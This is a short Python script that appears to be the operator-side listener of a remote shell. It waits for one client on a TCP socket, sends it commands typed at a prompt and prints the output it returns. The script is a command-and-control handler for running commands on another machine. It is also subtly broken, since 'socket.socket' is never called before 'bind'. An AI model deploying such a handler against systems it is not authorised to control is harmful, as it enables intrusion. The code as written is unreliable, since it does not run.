import socket

HOST = '127.0.0.1' # '192.168.0.108'
PORT  = 8081 #2222

server = socket.socket
server.bind((HOST, PORT))
print("[+] Server Started")
print("[+] Listening For Client Connection ...")
server.listen(1)
client, client_addr = server.accept()
print("[+] {} Client connected to the server".format(client_addr))

while True:
    command = input("Enter Command : ")
    command = command.encode()
    client.send(command)
    print("[-] Command Sent")
    output = client.recv(1024)
    output = output.decode()
    print("Output {}".format(output))